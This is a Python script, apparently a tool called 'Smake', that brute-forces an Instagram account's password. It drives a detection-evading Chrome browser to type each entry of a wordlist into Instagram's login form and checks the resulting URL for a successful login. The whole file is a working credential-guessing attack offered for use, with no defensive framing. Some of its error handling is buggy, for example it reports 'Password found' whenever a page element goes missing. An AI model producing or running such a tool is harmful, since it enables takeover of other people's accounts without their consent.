import selenium
import undetected_chromedriver as uc
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException
import os
import platform
import time
from pystyle import Colors, Colorate

if platform.system() == "Windows":
    os.system("cls")

if platform.system() == "Linux":
    os.system("clear")

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

smake = print(Colorate.Vertical(Colors.purple_to_blue,"""

    ░██████╗███╗░░░███╗░█████╗░██╗░░██╗███████╗
    ██╔════╝████╗░████║██╔══██╗██║░██╔╝██╔════╝
    ╚█████╗░██╔████╔██║███████║█████═╝░█████╗░░
    ░╚═══██╗██║╚██╔╝██║██╔══██║██╔═██╗░██╔══╝░░
    ██████╔╝██║░╚═╝░██║██║░░██║██║░╚██╗███████╗
    ╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝

"""))

def get_passwords(file_path):
    with open(file_path, 'r',encoding="utf-8") as f:
        passwords = f.readlines()
    return passwords

try:
    instaname = input(R + "İnstagram Name: " + W)
    print(G + "=====================================" + W)
    Worldlist = input(R + "Worldlist Path: " + W)
    print(G + "=====================================" + W)
    ChromeDriver = input(R + "Driver Path: " + W)
    print(G + "=====================================" + W)
    passwords = get_passwords(Worldlist)

    driver = uc.Chrome(executable_path=f'{ChromeDriver}')
    driver.get("https://www.instagram.com/login")
    time.sleep(2)
    ad = driver.find_element(by="xpath", value="//*[@id='loginForm']/div/div[1]/div/label/input")
    ad.send_keys(instaname)

except KeyboardInterrupt():
    print(R + "[!]" + W +"KeyboardInterrupt")

except FileNotFoundError():
    print(R + "[!]" + W +"FileNotFoundError")


 
found_password = None

for password in passwords:
    try:
        sifredene = driver.find_element(by="xpath", value="//*[@id='loginForm']/div/div[2]/div/label/input")
        sifredene.send_keys(password.strip())
        sifredene.send_keys(Keys.RETURN)
        time.sleep(4)
        if driver.current_url == "https://www.instagram.com/accounts/onetap/?next=%2F" or driver.current_url == "https://www.instagram.com/accounts/onetap/?next=https%3A%2F%2Fwww.instagram.com%2Flogin%2F%3F__coig_login%3D1":
            found_password = password
            print(f"{C}Password found: {G}{password.strip()}{W}")
            time.sleep(999999)
            break
    
        sifredene.send_keys(Keys.CONTROL + "a")
        sifredene.send_keys(Keys.DELETE)
        time.sleep(1)
    except (NoSuchElementException, StaleElementReferenceException):
        print(f"{C}Password found: {G}{password.strip()}{W}")
        time.sleep(999999)
        break
    except KeyboardInterrupt():
        print(R + "[!]" + W +"KeyboardInterrupt")
    
if found_password is None:
    print(f"{R}Could not find password!{W}")